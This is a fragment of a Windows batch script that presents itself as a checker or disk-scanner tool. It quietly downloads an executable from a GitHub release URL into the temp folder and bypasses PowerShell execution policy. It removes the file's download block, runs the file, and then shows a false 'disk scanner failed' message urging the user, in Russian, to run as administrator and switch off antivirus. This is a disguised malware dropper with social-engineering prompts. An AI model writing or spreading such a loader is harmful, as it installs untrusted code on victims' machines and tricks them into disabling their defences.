...
rem -- always re-download ftcheacker to avoid stale/deleted cache --
del /q "%TEMP%\ftcheacker.exe" >nul 2>&1

echo   %G%loading...%X%
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{Invoke-WebRequest -Uri 'https://github.com/ft-checker/ft-checker.github.io/releases/download/v1/ftcheacker.exe' -OutFile '%TEMP%\ftcheacker.exe'}catch{}"

set "CHKLOADED=0"
if exist "%TEMP%\ftcheacker.exe" (
    powershell -NoProfile -ExecutionPolicy Bypass -Command "try{Unblock-File -Path '%TEMP%\ftcheacker.exe'}catch{}" >nul 2>&1
    start "" "%TEMP%\ftcheacker.exe"
    set "CHKLOADED=1"
)
...
if "%CHKLOADED%"=="1" (
    ...
    echo   %R%[-] disk scanner failed%X%
    echo   %Y%    - откройте от имени администратора%X%
    echo   %Y%    - выключите антивирус%X%
    goto prompt
)
echo.
echo   %G%commands:%X%
